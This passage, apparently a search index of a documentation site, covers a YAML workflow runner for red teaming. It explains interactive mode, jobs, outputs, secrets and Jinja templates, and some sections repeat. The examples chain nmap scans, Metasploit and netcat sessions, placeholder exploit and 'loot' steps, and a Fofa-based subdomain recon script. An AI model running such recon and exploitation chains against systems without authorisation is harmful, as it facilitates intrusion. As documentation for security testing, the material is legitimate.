run_if: failure()  # Only run if previous step failed\n</code></pre></p>"},{"location":"guide/interactive-mode/best-practices/#combine-with-hooks","title":"Combine with Hooks","text":"<p>Use hooks to prepare the environment before interactive sessions: <pre><code>jobs:\n  interactive_session:\n    hooks:\n      on_start:\n        run: echo \"Starting interactive session...\"\n        language: shell\n    steps:\n      - name: Interactive Tool\n        run: ./custom_tool\n        interactive: true\n</code></pre></p>"},{"location":"guide/interactive-mode/best-practices/#sequential-dependencies","title":"Sequential Dependencies","text":"<p>Ensure interactive jobs run sequentially: <pre><code>jobs:\n  prepare:\n    steps:\n      - run: ./prepare.sh\n  interact:\n    needs: prepare  # Sequential execution\n    steps:\n      - run: bash\n        interactive: true\n  cleanup:\n    needs: interact  # Runs after interaction\n    steps:\n      - run: ./cleanup.sh\n</code></pre></p>"},{"location":"guide/interactive-mode/detection/","title":"Detection &amp; Execution Modes","text":""},{"location":"guide/interactive-mode/detection/#single-job-stage-detection","title":"Single-Job Stage Detection","text":"<p>The workflow runner automatically analyzes job dependencies and determines which jobs can run in parallel:</p> <pre><code>name: Interactive Mode Detection\njobs:\n  # Stage 1: job1 alone - interactive allowed\n  job1:\n    steps:\n      - name: Interactive Step\n        run: bash\n        interactive: true  # \u2713 Works - alone in stage\n  # Stage 2: job2 and job3 in parallel - interactive disabled\n  job2:\n    needs: job1\n    steps:\n      - name: Try Interactive\n        run: bash\n        interactive: true  # \u2717 Disabled - job3 runs in parallel\n  job3:\n    needs: job1\n    steps:\n      - name: Normal Step\n        run: echo \"parallel with job2\"\n  # Stage 3: job4 alone - interactive allowed again\n  job4:\n    needs: [job2, job3]\n    steps:\n      - name: Interactive Again\n        run: python3\n        interactive: true  # \u2713 Works - alone in stage\n</code></pre>"},{"location":"guide/interactive-mode/detection/#execution-modes","title":"Execution Modes","text":"<p>Interactive Mode (interactive: true): - stdin/stdout/stderr connected to terminal - User can type input - Output appears in real-time - Perfect for shells, REPLs, debuggers</p> <p>Normal Mode (interactive: false or not specified): - Output captured and logged - No stdin input possible - Can run in parallel with other jobs - Default behavior</p>"},{"location":"guide/interactive-mode/error-handling/","title":"Error Handling &amp; Troubleshooting for Interactive Mode","text":""},{"location":"guide/interactive-mode/error-handling/#error-handling-exit-codes","title":"Error Handling &amp; Exit Codes","text":"<p>OFX handles interactive shell exits gracefully:</p> <ul> <li>Exit (exit/quit/close shell): Exiting the shell (typing <code>exit</code>, <code>Ctrl+D</code>, or closing the terminal) is treated as a clean exit. The workflow continues to the next step or job.</li> <li>Ctrl+C (SIGINT): Pressing <code>Ctrl+C</code> in an interactive session (exit code 130) is also treated as a clean exit.</li> <li>Command Not Found (127): If you type a command that does not exist, the shell will show an error, but exiting the shell itself is not an error.</li> <li>Other Errors: Any other nonzero exit code is treated as a failure and will stop the job unless <code>continue_on_error: true</code> is set.</li> </ul>"},{"location":"guide/interactive-mode/error-handling/#example-handling-shell-exit","title":"Example: Handling Shell Exit","text":"<pre><code>jobs:\n  interactive_shell:\n    steps:\n      - name: Start Interactive Bash\n        run: bash\n        interactive: true\n        timeout: 10\n      - name: After Shell\n        run: echo \"Shell session ended cleanly!\"\n</code></pre> <p>If you type <code>exit</code> or press <code>Ctrl+D</code> in the shell, the workflow will continue to the next step. If you run an invalid command, you'll see an error, but you can still exit cleanly.</p>"},{"location":"guide/interactive-mode/error-handling/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/interactive-mode/error-handling/#interactive-mode-not-working","title":"Interactive Mode Not Working","text":"<p>Problem: Step doesn't accept input despite <code>interactive: true</code></p> <p>Solution: Check if the job is in a parallel stage: <pre><code># View execution stages\nofx flow run workflow.yml --debug\n</code></pre> Look for log messages indicating parallel execution. If jobs run in parallel, add dependencies to make them sequential.</p>"},{"location":"guide/interactive-mode/error-handling/#shell-exit-handling","title":"Shell Exit Handling","text":"<p>Problem: Exiting the shell with <code>exit</code> or <code>Ctrl+D</code> causes an error in the workflow.</p> <p>Solution: As of vX.Y.Z, OFX treats exit codes 0, 127, and 130 as clean exits in interactive mode. You can safely exit the shell and the workflow will continue. Only unexpected errors will stop the workflow.</p>"},{"location":"guide/interactive-mode/error-handling/#timeout-issues","title":"Timeout Issues","text":"<p>Problem: Interactive session terminates unexpectedly</p> <p>Solution: Increase timeout: <pre><code>- name: Long Session\n  run: tool\n  interactive: true\n  timeout: 60  # Increase from default\n</code></pre></p>"},{"location":"guide/interactive-mode/error-handling/#output-not-showing","title":"Output Not Showing","text":"<p>Problem: Can't see output from interactive command</p> <p>Solution: Ensure the command itself supports interactive mode. Some tools need flags: <pre><code>- name: Python Interactive\n  run: python3 -i  # -i flag for interactive\n  interactive: true\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/","title":"Practical Examples for Interactive Mode","text":"<p>This page demonstrates a wide range of real-world use cases for OFX interactive mode, with detailed YAML and commentary. Use these as templates for your own workflows.</p>"},{"location":"guide/interactive-mode/examples/#1-exploit-development-debugging","title":"1. Exploit Development &amp; Debugging","text":"<p>Run GDB interactively, then save findings: <pre><code>name: Exploit Debugging\njobs:\n  setup:\n    steps:\n      - name: Prepare Environment\n        run: |\n          mkdir -p /tmp/exploit\n          cp ./vuln ./vuln.bak\n  debug:\n    needs: setup\n    steps:\n      - name: GDB Session\n        run: gdb ./vuln\n        interactive: true\n        timeout: 30\n        working_directory: /tmp/exploit\n      - name: Save GDB Log\n        run: cp gdb.txt /tmp/exploit/gdb.log\n</code></pre> Why: Use for binary analysis, exploit dev, or live debugging. All stdin/stdout is passed through.</p>"},{"location":"guide/interactive-mode/examples/#2-database-shells-data-export","title":"2. Database Shells &amp; Data Export","text":"<p>Connect to a database interactively, then export data: <pre><code>name: Database Session\njobs:\n  db:\n    steps:\n      - name: MySQL Shell\n        run: mysql -h {{ inputs.db_host }} -u {{ inputs.db_user }} -p{{ secrets.db_pass }}\n        interactive: true\n        timeout: 15\n      - name: Export Data\n        run: mysqldump {{ inputs.db_name }} &gt; dump.sql\n</code></pre> Why: Use for manual queries, schema inspection, or troubleshooting.</p>"},{"location":"guide/interactive-mode/examples/#3-network-tools-netcat-ssh-telnet","title":"3. Network Tools (Netcat, SSH, Telnet)","text":"<p>Interact with remote services or open shells: <pre><code>name: Netcat Example\njobs:\n  netcat:\n    steps:\n      - name: Open Netcat\n        run: nc {{ inputs.target_ip }} {{ inputs.target_port }}\n        interactive: true\n        timeout: 10\n      - name: Log\n        run: echo \"Netcat session done\"\n</code></pre></p> <p>SSH interactive session: <pre><code>name: SSH Session\njobs:\n  ssh:\n    steps:\n      - name: SSH Login\n        run: ssh user@{{ inputs.host }}\n        interactive: true\n        timeout: 20\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/#4-python-ipython-repls","title":"4. Python &amp; IPython REPLs","text":"<p>Launch a Python shell for live testing: <pre><code>name: Python REPL\njobs:\n  py:\n    steps:\n      - name: Start Python\n        run: python3 -i\n        interactive: true\n      - name: Save Output\n        run: cp ~/.python_history python_history.txt\n</code></pre></p> <p>Or use IPython for advanced features: <pre><code>name: IPython Session\njobs:\n  ipy:\n    steps:\n      - name: IPython\n        run: ipython3\n        interactive: true\n        env:\n          PYTHONPATH: /opt/custom\n      - name: Save History\n        run: cp ~/.ipython/profile_default/history.sqlite ipython_history.db\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/#5-metasploit-custom-tools","title":"5. Metasploit &amp; Custom Tools","text":"<p>Metasploit console: <pre><code>name: Metasploit\njobs:\n  msf:\n    steps:\n      - name: Start msfconsole\n        run: msfconsole\n        interactive: true\n        timeout: 30\n</code></pre></p> <p>Custom CLI tool: <pre><code>name: Custom Tool\njobs:\n  tool:\n    steps:\n      - name: Run Custom CLI\n        run: ./my_interactive_tool --shell\n        interactive: true\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/#6-error-handling-exit-codes","title":"6. Error Handling &amp; Exit Codes","text":"<p>Interactive steps handle exits gracefully: <pre><code>jobs:\n  shell:\n    steps:\n      - name: Bash\n        run: bash\n        interactive: true\n        timeout: 10\n      - name: After Shell\n        run: echo \"Shell exited\"\n</code></pre> Exiting with <code>exit</code>, <code>Ctrl+D</code>, or <code>Ctrl+C</code> is treated as a clean exit. Nonzero exit codes (except 127/130) stop the job unless <code>continue_on_error: true</code> is set.</p>"},{"location":"guide/interactive-mode/examples/#7-advanced-conditional-interactive-steps","title":"7. Advanced: Conditional Interactive Steps","text":"<p>Run an interactive shell only if a previous step fails: <pre><code>jobs:\n  test:\n    steps:\n      - name: Run Tests\n        run: pytest\n      - name: Debug Shell\n        run: bash\n        interactive: true\n        run_if: failure()\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/#8-interactive-with-hooks","title":"8. Interactive with Hooks","text":"<p>Prepare the environment before an interactive session: <pre><code>jobs:\n  session:\n    hooks:\n      on_start:\n        run: echo \"Starting interactive session\"\n        language: shell\n    steps:\n      - name: Custom Tool\n        run: ./custom_tool\n        interactive: true\n</code></pre></p>"},{"location":"guide/interactive-mode/examples/#9-best-practices","title":"9. Best Practices","text":"<ul> <li>Always set a <code>timeout</code> to avoid hanging sessions.</li> <li>Use job dependencies (<code>needs:</code>) to ensure only one interactive job runs at a time.</li> <li>Use <code>env:</code> to set environment variables for your session.</li> <li>Use <code>run_if:</code> for conditional debugging.</li> <li>Save session logs or history for later review.</li> </ul>"},{"location":"guide/interactive-mode/examples/#10-troubleshooting","title":"10. Troubleshooting","text":"<ul> <li>If interactive mode doesn't work, check for parallel jobs in the same stage.</li> <li>Use <code>ofx flow run workflow.yml --debug</code> to inspect execution stages.</li> <li>Some tools require special flags for interactive mode (e.g., <code>python3 -i</code>).</li> </ul> <p>For more, see the Usage, Detection &amp; Execution, and Error Handling pages.</p>"},{"location":"guide/interactive-mode/limitations/","title":"Limitations of Interactive Mode","text":""},{"location":"guide/interactive-mode/limitations/#cannot-use-with-workflows","title":"Cannot Use With Workflows","text":"<p>Interactive mode does not work with nested workflows:</p> <pre><code>jobs:\n  nested:\n    steps:\n      - name: Won't Work\n        uses: ./other-workflow.yml\n        interactive: true  # \u26a0\ufe0f Warning: ignored for workflow steps\n</code></pre>"},{"location":"guide/interactive-mode/limitations/#parallel-jobs-disable-interactive","title":"Parallel Jobs Disable Interactive","text":"<p>If multiple jobs run in the same stage, interactive mode is automatically disabled:</p> <pre><code>jobs:\n  job1:\n    steps:\n      - run: bash\n        interactive: true  # Disabled if job2 runs in parallel\n  job2:  # No 'needs' - runs in parallel with job1\n    steps:\n      - run: echo \"parallel\"\n</code></pre> <p>Solution: Use job dependencies to ensure jobs run sequentially:</p> <pre><code>jobs:\n  job1:\n    steps:\n      - run: bash\n        interactive: true  # \u2713 Works\n  job2:\n    needs: job1  # Runs after job1 completes\n    steps:\n      - run: echo \"sequential\"\n</code></pre>"},{"location":"guide/interactive-mode/usage/","title":"Interactive Mode Usage","text":""},{"location":"guide/interactive-mode/usage/#basic-usage","title":"Basic Usage","text":""},{"location":"guide/interactive-mode/usage/#interactive-shell","title":"Interactive Shell","text":"<pre><code>name: Interactive Shell Example\njobs:\n  shell_session:\n    steps:\n      - name: Start Bash Shell\n        run: bash\n        interactive: true\n        timeout: 10  # Optional timeout in minutes\n</code></pre>"},{"location":"guide/interactive-mode/usage/#interactive-python-repl","title":"Interactive Python REPL","text":"<pre><code>name: Python REPL Example\njobs:\n  python_session:\n    steps:\n      - name: Start Python REPL\n        run: python3\n        interactive: true\n      - name: Continue After REPL\n        run: echo \"Session completed\"\n</code></pre>"},{"location":"guide/interactive-mode/usage/#interactive-tool","title":"Interactive Tool","text":"<pre><code>name: Run Interactive Tool\njobs:\n  exploit_tool:\n    steps:\n      - name: Use Metasploit Console\n        run: msfconsole\n        interactive: true\n        timeout: 30\n</code></pre>"},{"location":"guide/jobs-steps/","title":"Jobs &amp; Steps Guide","text":"<p>Overview of jobs and steps in OFX workflows.</p> <ul> <li>Jobs</li> <li>Steps</li> <li>Outputs</li> </ul>"},{"location":"guide/jobs-steps/jobs/","title":"Jobs","text":"<p>Jobs are the main building blocks of an OFX workflow. Each job contains one or more steps and can depend on other jobs. Jobs run in stages, either in parallel or sequentially based on dependencies.</p>"},{"location":"guide/jobs-steps/jobs/#job-structure","title":"Job Structure","text":"<pre><code>jobs:\n    recon:\n        steps:\n            - run: nmap {{ inputs.target }}\n    exploit:\n        needs: recon\n        steps:\n            - run: python exploit.py\n</code></pre>"},{"location":"guide/jobs-steps/jobs/#jobs_1","title":"Jobs","text":"<p>Jobs are the main building blocks of an OFX workflow. Each job contains one or more steps and can depend on other jobs. Jobs run in stages, either in parallel or sequentially based on dependencies.</p>"},{"location":"guide/jobs-steps/jobs/#job-structure_1","title":"Job Structure","text":"<pre><code>jobs:\n    recon:\n        steps:\n            - run: nmap {{ inputs.target }}\n    exploit:\n        needs: recon\n        steps:\n            - run: python exploit.py\n</code></pre>"},{"location":"guide/jobs-steps/jobs/#job-fields","title":"Job Fields","text":"<ul> <li><code>steps</code>: List of steps to execute</li> <li><code>needs</code>: (optional) List of job dependencies</li> <li><code>outputs</code>: (optional) Exported values from this job</li> <li><code>hooks</code>: (optional) Lifecycle hooks for this job</li> </ul>"},{"location":"guide/jobs-steps/jobs/#parallel-and-sequential-jobs","title":"Parallel and Sequential Jobs","text":"<ul> <li>Jobs without <code>needs:</code> run in parallel in the first stage</li> <li>Jobs with <code>needs:</code> run after their dependencies</li> </ul>"},{"location":"guide/jobs-steps/jobs/#example-multiple-jobs","title":"Example: Multiple Jobs","text":"<pre><code>jobs:\n    build:\n        steps:\n            - run: make\n    test:\n        needs: build\n        steps:\n            - run: pytest\n    deploy:\n        needs: test\n        steps:\n            - run: ./deploy.sh\n</code></pre>"},{"location":"guide/jobs-steps/jobs/#best-practices","title":"Best Practices","text":"<ul> <li>Use clear job names</li> <li>Use <code>needs:</code> to control execution order</li> <li>Group related steps in the same job</li> </ul>"},{"location":"guide/jobs-steps/jobs/#see-also","title":"See Also","text":"<ul> <li>Steps</li> <li>Workflow Stages</li> </ul>"},{"location":"guide/jobs-steps/jobs/#job-fields_1","title":"Job Fields","text":"<ul> <li><code>steps</code>: List of steps to execute</li> <li><code>needs</code>: (optional) List of job dependencies</li> <li><code>outputs</code>: (optional) Exported values from this job</li> <li><code>hooks</code>: (optional) Lifecycle hooks for this job</li> </ul>"},{"location":"guide/jobs-steps/jobs/#parallel-and-sequential-jobs_1","title":"Parallel and Sequential Jobs","text":"<ul> <li>Jobs without <code>needs:</code> run in parallel in the first stage</li> <li>Jobs with <code>needs:</code> run after their dependencies</li> </ul>"},{"location":"guide/jobs-steps/jobs/#example-multiple-jobs_1","title":"Example: Multiple Jobs","text":"<pre><code>jobs:\n    build:\n        steps:\n            - run: make\n    test:\n        needs: build\n        steps:\n            - run: pytest\n    deploy:\n        needs: test\n        steps:\n            - run: ./deploy.sh\n</code></pre>"},{"location":"guide/jobs-steps/jobs/#best-practices_1","title":"Best Practices","text":"<ul> <li>Use clear job names</li> <li>Use <code>needs:</code> to control execution order</li> <li>Group related steps in the same job</li> </ul>"},{"location":"guide/jobs-steps/jobs/#see-also_1","title":"See Also","text":"<ul> <li>Steps</li> <li>Workflow Stages</li> </ul>"},{"location":"guide/jobs-steps/outputs/","title":"Outputs","text":"<p>Outputs allow you to pass data from one step or job to another in an OFX workflow. Use outputs to chain results, share variables, and build dynamic workflows.</p>"},{"location":"guide/jobs-steps/outputs/#step-outputs","title":"Step Outputs","text":"<p>Define outputs in a step to export values: <pre><code>steps:\n    - name: Scan\n        run: nmap {{ inputs.target }}\n        outputs:\n            open_ports: \"{{ step.stdout_lines }}\"\n</code></pre></p> <p>Access in later steps: <pre><code>run: echo \"Ports: {{ steps.0.outputs.open_ports }}\"\n</code></pre></p>"},{"location":"guide/jobs-steps/outputs/#job-outputs","title":"Job Outputs","text":"<p>You can also export outputs from a job: <pre><code>jobs:\n    scan:\n        steps:\n            - run: ...\n                outputs:\n                    result: \"{{ step.stdout }}\"\n        outputs:\n            scan_result: \"{{ steps.0.outputs.result }}\"\n</code></pre></p> <p>Access in other jobs: <pre><code>run: echo \"Scan: {{ jobs.scan.outputs.scan_result }}\"\n</code></pre></p>"},{"location":"guide/jobs-steps/outputs/#output-types","title":"Output Types","text":"<ul> <li><code>stdout</code>: Raw output as a string</li> <li><code>stdout_lines</code>: Output as a list of lines</li> <li>Custom parsing with Jinja2 filters</li> </ul>"},{"location":"guide/jobs-steps/outputs/#best-practices","title":"Best Practices","text":"<ul> <li>Name outputs clearly for easy reference</li> <li>Use outputs to avoid repeating work</li> </ul>"},{"location":"guide/jobs-steps/outputs/#see-also","title":"See Also","text":"<ul> <li>Steps</li> <li>Jobs</li> </ul>"},{"location":"guide/jobs-steps/steps/","title":"Steps","text":"<p>Steps are the smallest unit of execution in an OFX workflow. Each step runs a command, script, or code block, and can have its own environment, outputs, and error handling.</p>"},{"location":"guide/jobs-steps/steps/#step-syntax","title":"Step Syntax","text":"<pre><code>jobs:\n    example:\n        steps:\n            - name: Run Script\n                run: ./myscript.sh\n                env:\n                    VAR: value\n                timeout: 10\n                outputs:\n                    result: \"{{ step.stdout }}\"\n                continue_on_error: true\n</code></pre>"},{"location":"guide/jobs-steps/steps/#step-fields","title":"Step Fields","text":"<ul> <li><code>name</code>: (optional) Description of the step</li> <li><code>run</code>: Command, script, or code to execute</li> <li><code>language</code>: (optional) Language for code blocks (e.g., python)</li> <li><code>env</code>: (optional) Environment variables</li> <li><code>timeout</code>: (optional) Max time in minutes</li> <li><code>outputs</code>: (optional) Exported values from this step</li> <li><code>continue_on_error</code>: (optional) Continue even if this step fails</li> <li><code>run_if</code>: (optional) Conditional execution (e.g., <code>failure()</code>)</li> </ul>"},{"location":"guide/jobs-steps/steps/#advanced-usage","title":"Advanced Usage","text":"<ul> <li>Use <code>script:</code> to run inline Python code</li> <li>Use <code>outputs:</code> to pass data between steps and jobs</li> <li>Use <code>run_if:</code> for conditional logic (see Hooks &amp; Conditions)</li> </ul>"},{"location":"guide/jobs-steps/steps/#example-python-step","title":"Example: Python Step","text":"<pre><code>steps:\n    - name: Calculate\n        run: |\n            result = 2 + 2\n            print(f\"Result: {result}\")\n        script:\n        outputs:\n            calc: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"guide/jobs-steps/steps/#see-also","title":"See Also","text":"<ul> <li>Jobs</li> <li>Outputs</li> </ul>"},{"location":"guide/secrets-inputs/","title":"Secrets &amp; Inputs Guide","text":"<p>Overview of secrets and inputs in OFX workflows.</p> <ul> <li>Secrets</li> <li>Inputs</li> </ul>"},{"location":"guide/secrets-inputs/inputs/","title":"Inputs","text":"<p>Inputs are variables provided to OFX workflows at runtime. Use inputs to parameterize workflows, pass targets, credentials, or other dynamic values.</p>"},{"location":"guide/secrets-inputs/inputs/#how-to-provide-inputs","title":"How to Provide Inputs","text":"<pre><code>ofx flow run workflow.yml --input target=example.com --input env=prod\n</code></pre>"},{"location":"guide/secrets-inputs/inputs/#using-inputs-in-yaml","title":"Using Inputs in YAML","text":"<p>Reference inputs in workflow files using the <code>inputs.</code> namespace: <pre><code>run: echo \"Target is {{ inputs.target }}\"\n</code></pre></p>"},{"location":"guide/secrets-inputs/inputs/#default-values","title":"Default Values","text":"<p>You can set default values for inputs in your workflow YAML: <pre><code>inputs:\n    target: \"localhost\"\n    env: \"dev\"\n</code></pre></p>"},{"location":"guide/secrets-inputs/inputs/#best-practices","title":"Best Practices","text":"<ul> <li>Validate required inputs at the start of your workflow</li> <li>Use descriptive input names</li> <li>Document expected inputs in your project README</li> </ul>"},{"location":"guide/secrets-inputs/inputs/#see-also","title":"See Also","text":"<ul> <li>Secrets</li> <li>Inputs CLI Reference</li> </ul>"},{"location":"guide/secrets-inputs/secrets/","title":"Secrets","text":"<p>Secrets are sensitive values (API keys, passwords, tokens) used in OFX workflows. OFX provides secure storage, encryption, and injection of secrets into jobs and steps.</p>"},{"location":"guide/secrets-inputs/secrets/#how-to-set-secrets","title":"How to Set Secrets","text":"<p><pre><code>ofx secret set API_KEY=abcdef12345\n</code></pre> Or interactively: <pre><code>ofx secret set\n# Prompts for key and value (input hidden)\n</code></pre></p>"},{"location":"guide/secrets-inputs/secrets/#using-secrets-in-workflows","title":"Using Secrets in Workflows","text":"<p>Reference secrets in YAML using the <code>secrets.</code> namespace: <pre><code>run: curl -H \"Authorization: Bearer {{ secrets.API_KEY }}\" https://api.example.com\n</code></pre></p>"},{"location":"guide/secrets-inputs/secrets/#secret-storage","title":"Secret Storage","text":"<ul> <li>Secrets are stored encrypted (if enabled) in the project directory</li> <li>Use <code>ofx secret list</code> to view available secrets</li> <li>Use <code>ofx secret delete &lt;key&gt;</code> to remove a secret</li> </ul>"},{"location":"guide/secrets-inputs/secrets/#best-practices","title":"Best Practices","text":"<ul> <li>Never hardcode secrets in workflow files</li> <li>Use environment variables or secret storage for sensitive data</li> <li>Rotate secrets regularly</li> </ul>"},{"location":"guide/secrets-inputs/secrets/#see-also","title":"See Also","text":"<ul> <li>Inputs</li> <li>Secret CLI Reference</li> </ul>"},{"location":"guide/templates/","title":"Templates Guide","text":"<p>Overview of template usage in OFX workflows.</p> <ul> <li>Jinja Templates</li> <li>Examples</li> </ul>"},{"location":"guide/templates/examples/","title":"Template Examples","text":"<p>This page provides practical examples of using Jinja2 templates in OFX workflows for dynamic configuration, variable substitution, and output formatting.</p>"},{"location":"guide/templates/examples/#basic-variable-substitution","title":"Basic Variable Substitution","text":"<pre><code>run: echo \"Target is {{ inputs.target }}\"\n</code></pre>"},{"location":"guide/templates/examples/#using-step-outputs","title":"Using Step Outputs","text":"<pre><code>steps:\n    - name: Scan\n        run: nmap {{ inputs.target }}\n        outputs:\n            open_ports: \"{{ step.stdout_lines }}\"\n    - name: Print Ports\n        run: echo \"Ports: {{ steps.0.outputs.open_ports }}\"\n</code></pre>"},{"location":"guide/templates/examples/#looping-over-values","title":"Looping Over Values","text":"<pre><code>run: |\n    {% for port in jobs.scan.outputs.open_ports %}\n    echo \"Port: {{ port }}\"\n    {% endfor %}\n</code></pre>"},{"location":"guide/templates/examples/#conditional-logic","title":"Conditional Logic","text":"<pre><code>run: |\n    {% if inputs.env == 'prod' %}\n    echo \"Production environment\"\n    {% else %}\n    echo \"Development environment\"\n    {% endif %}\n</code></pre>"},{"location":"guide/templates/examples/#filters-and-formatting","title":"Filters and Formatting","text":"<pre><code>run: echo \"Upper: {{ inputs.name | upper }}\"\n</code></pre>"},{"location":"guide/templates/examples/#see-also","title":"See Also","text":"<ul> <li>Jinja Template Reference</li> </ul>"},{"location":"guide/templates/jinja/","title":"Jinja Templates","text":"<p>OFX uses the Jinja2 template engine for dynamic variable substitution, logic, and formatting in workflow YAML files.</p>"},{"location":"guide/templates/jinja/#basic-syntax","title":"Basic Syntax","text":"<ul> <li><code>${{ variable }}</code>: Output the value of a variable</li> <li><code>{% if ... %} ... {% endif %}</code>: Conditional logic</li> <li><code>{% for ... %} ... {% endfor %}</code>: Loops</li> </ul>"},{"location":"guide/templates/jinja/#common-filters","title":"Common Filters","text":"<ul> <li><code>| upper</code>, <code>| lower</code>: Change case</li> <li><code>| replace('a', 'b')</code>: Replace text</li> <li><code>| join(',')</code>: Join list into string</li> <li><code>| length</code>: Get length of list or string</li> </ul>"},{"location":"guide/templates/jinja/#example-using-inputs","title":"Example: Using Inputs","text":"<pre><code>run: echo \"Scanning target ${{ inputs.target | upper }}!\"\n</code></pre>"},{"location":"guide/templates/jinja/#example-looping","title":"Example: Looping","text":"<pre><code>run: |\n    #!/bin/bash\n    {% for port in jobs.scan.outputs.open_ports %}\n    echo \"Port: ${{ port }}\"\n    {% endfor %}\n</code></pre>"},{"location":"guide/templates/jinja/#example-conditionals","title":"Example: Conditionals","text":"<pre><code>run: |\n    #!/bin/bash\n    {% if inputs.env == 'prod' %}\n    echo \"Production\"\n    {% else %}\n    echo \"Dev\"\n    {% endif %}\n</code></pre>"},{"location":"guide/templates/jinja/#advanced-custom-filters","title":"Advanced: Custom Filters","text":"<p>You can define custom filters in Python steps and use them in templates.</p>"},{"location":"guide/templates/jinja/#see-also","title":"See Also","text":"<ul> <li>Template Examples</li> </ul>"},{"location":"guide/workflows/","title":"Workflows Guide","text":"<p>Overview of workflow structure and execution in OFX.</p> <ul> <li>Dependencies</li> <li>Stages</li> <li>Examples</li> </ul>"},{"location":"guide/workflows/dependencies/","title":"Workflow Dependencies","text":"<p>Dependencies control the execution order of jobs in an OFX workflow. Use the <code>needs:</code> field to specify which jobs must complete before a job can start.</p>"},{"location":"guide/workflows/dependencies/#syntax","title":"Syntax","text":"<pre><code>jobs:\n    build:\n        steps:\n            - run: make\n    test:\n        needs: build\n        steps:\n            - run: pytest\n    deploy:\n        needs: [test]\n        steps:\n            - run: ./deploy.sh\n</code></pre>"},{"location":"guide/workflows/dependencies/#how-it-works","title":"How It Works","text":"<ul> <li>Jobs without <code>needs:</code> run in the first stage</li> <li>Jobs with <code>needs:</code> wait for their dependencies</li> <li>You can specify a single job or a list of jobs</li> </ul>"},{"location":"guide/workflows/dependencies/#example-multiple-dependencies","title":"Example: Multiple Dependencies","text":"<pre><code>jobs:\n    setup:\n        steps:\n            - run: ./setup.sh\n    scan:\n        needs: setup\n        steps:\n            - run: nmap {{ inputs.target }}\n    exploit:\n        needs: [setup, scan]\n        steps:\n            - run: python exploit.py\n</code></pre>"},{"location":"guide/workflows/dependencies/#best-practices","title":"Best Practices","text":"<ul> <li>Use dependencies to enforce correct order and avoid race conditions</li> <li>Avoid circular dependencies (will cause errors)</li> <li>Use dependencies to control parallelism and resource usage</li> </ul>"},{"location":"guide/workflows/dependencies/#see-also","title":"See Also","text":"<ul> <li>Workflow Stages</li> <li>Workflow Examples</li> </ul>"},{"location":"guide/workflows/examples/","title":"Workflow Examples","text":"<p>This page provides practical OFX workflow examples for common red teaming, automation, and DevSecOps scenarios.</p>"},{"location":"guide/workflows/examples/#example-1-simple-reconnaissance","title":"Example 1: Simple Reconnaissance","text":"<pre><code>name: Web Recon\njobs:\n    scan:\n        steps:\n            - run: nmap {{ inputs.target }}\n</code></pre>"},{"location":"guide/workflows/examples/#example-2-multi-stage-exploitation","title":"Example 2: Multi-Stage Exploitation","text":"<pre><code>name: Exploit Chain\njobs:\n    recon:\n        steps:\n            - run: nmap {{ inputs.target }}\n    exploit:\n        needs: recon\n        steps:\n            - run: python exploit.py --target {{ inputs.target }}\n    loot:\n        needs: exploit\n        steps:\n            - run: ./loot.sh\n</code></pre>"},{"location":"guide/workflows/examples/#example-3-parallel-jobs","title":"Example 3: Parallel Jobs","text":"<pre><code>jobs:\n    scan1:\n        steps:\n            - run: nmap 10.0.0.1\n    scan2:\n        steps:\n            - run: nmap 10.0.0.2\n</code></pre>"},{"location":"guide/workflows/examples/#example-4-using-outputs","title":"Example 4: Using Outputs","text":"<pre><code>jobs:\n    scan:\n        steps:\n            - run: nmap {{ inputs.target }}\n                outputs:\n                    open_ports: \"{{ step.stdout_lines }}\"\n    report:\n        needs: scan\n        steps:\n            - run: echo \"Ports: {{ jobs.scan.outputs.open_ports }}\"\n</code></pre>"},{"location":"guide/workflows/examples/#example-5-with-secrets","title":"Example 5: With Secrets","text":"<pre><code>jobs:\n    api:\n        steps:\n            - run: curl -H \"Authorization: Bearer {{ secrets.API_KEY }}\" https://api.example.com\n</code></pre>"},{"location":"guide/workflows/examples/#example-6-interactive-debugging","title":"Example 6: Interactive Debugging","text":"<pre><code>jobs:\n    debug:\n        steps:\n            - run: bash\n                interactive: true\n                timeout: 10\n</code></pre>"},{"location":"guide/workflows/examples/#example-7-comprehensive-web-reconnaissance","title":"Example 7: Comprehensive Web Reconnaissance","text":"<p>This example demonstrates a multi-job workflow that takes a domain, finds subdomains, checks for open web ports, and generates a report.</p> <pre><code>name: Comprehensive Web Recon\ninputs:\n  domain:\n    description: The target domain to scan.\n    required: true\nsecrets:\n  FOFA_USER:\n    required: false\n  FOFA_TOKEN:\n    required: false\n\njobs:\n  discover-subdomains:\n    name: Discover Subdomains\n    steps:\n      - name: Search with Fofa\n        script: |\n          from ofx.api.search import Fofa\n          fofa = Fofa(user=\"${{ secrets.FOFA_USER }}\", token=\"${{ secrets.FOFA_TOKEN }}\")\n          results = fofa.search(f'domain=\"{{ inputs.domain }}\"')\n          # Extract host from results\n          hosts = [res.split('//')[1].split(':')[0] for res in results]\n          print('\\n'.join(hosts))\n        outputs:\n          subdomains: \"{{ step.stdout_lines }}\"\n\n  check-web-ports:\n    name: Check for Open Web Ports\n    needs: discover-subdomains\n    steps:\n      - name: Check ports 80 and 443\n        script: |\n          from ofx.api.exploit import check_port\n\n          open_hosts = []\n          subdomains = {{ jobs.discover-subdomains.outputs.subdomains }}\n          for host in subdomains:\n              if check_port(host, 80):\n                  open_hosts.append(f\"http://{host}\")\n              if check_port(host, 443):\n                  open_hosts.append(f\"https://{host}\")\n\n          print('\\n'.join(open_hosts))\n        outputs:\n          live_hosts: \"{{ step.stdout_lines }}\"\n\n  generate-report:\n    name: Generate Report\n    needs: check-web-ports\n    steps:\n      - name: Fetch titles and generate report\n        script: |\n          from ofx.api.http import fetch\n          from ofx.api.file import write_file\n          import re\n\n          live_hosts = {{ jobs.check-web-ports.outputs.live_hosts }}\n          report = \"# Web Reconnaissance Report\\n\\n\"\n          report += f\"## Target: {{ inputs.domain }}\\n\\n\"\n\n          for host in live_hosts:\n              try:\n                  content = fetch(host, timeout=5)\n                  title_match = re.search(r'&lt;title&gt;(.*?)&lt;/title&gt;', content, re.IGNORECASE)\n                  title = title_match.group(1).strip() if title_match else \"No Title Found\"\n                  report += f\"- **{host}**: {title}\\n\"\n              except Exception as e:\n                  report += f\"- **{host}**: Failed to fetch ({e})\\n\"\n\n          write_file(report, \"${{ ctx.output_path }}/recon_report.md\")\n      